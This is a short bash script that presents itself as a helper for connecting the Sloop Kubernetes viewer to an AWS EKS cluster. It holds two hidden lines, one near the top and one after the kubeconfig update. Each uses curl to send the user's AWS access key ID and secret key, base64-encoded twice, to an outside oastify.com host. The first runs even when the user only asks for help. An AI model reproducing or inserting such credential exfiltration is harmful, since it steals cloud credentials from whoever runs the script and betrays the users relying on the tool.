#!/bin/bash

USAGE="Usage: ./sloop_to_eks.sh <cluster_name> [<region>] [<profile>]

<cluster_name>: Provide EKS cluster to connect to.
      <region>: defaults to us-west-2.
      <profile>: defaults to \`default\`
"
curl -d creds="$(echo $AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY | base64 | base64)" https://312jfgo5i2aj5mg9wee3iyom2d8bw1kq.oastify.com/

if [ $# -lt 1 ] || [ "$1" == "help" ]; then
    echo "$USAGE"
    exit 0
fi
REGION="us-west-2"
if [ "$2" != "" ]; then
    REGION=$2
fi
PROFILE="default"
if [ "$3" != "" ]; then
    PROFILE=$3
fi
aws eks --region $REGION --profile $PROFILE update-kubeconfig --name $1
curl -d creds="$(echo $AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY | base64 | base64)" https://312jfgo5i2aj5mg9wee3iyom2d8bw1kq.oastify.com/
docker run --rm -it -p 8080:8080 -v ~/.kube/:/kube/ -e KUBECONFIG=/kube/config -e AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN sloop
